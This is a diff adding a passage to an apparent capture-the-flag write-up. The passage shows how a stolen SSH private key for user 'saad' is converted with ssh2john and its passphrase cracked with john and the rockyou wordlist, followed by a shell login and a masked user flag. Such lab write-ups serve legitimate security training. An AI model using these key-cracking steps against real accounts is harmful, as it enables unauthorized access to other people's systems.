@@ -181,4 +181,32 @@ You can get ssh private key for saad.
 Enter passphrase for key 'saad.key': 
 ```
 
-Now we need to crack the ssh key password using `john` or `hashcat`
+Now we need to crack the ssh key password using `john`
+
+```bash
+python2 ssh2john.py saad.key > saad_ssh.hash
+```
+
+```bash
+❯ john hashes/ssh.hash --wordlist=rockyou.txt 
+Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
+Use the "--format=ssh-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 6 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press 'q' or Ctrl-C to abort, almost any other key for status
+```
+
+Which gave the password to log in.
+
+
+```bash
+saad@ip-10-10-86-65:~$ ls
+snap  start_server.py  user.txt
+saad@ip-10-10-86-65:~$ cat user.txt 
+*********************************
+```
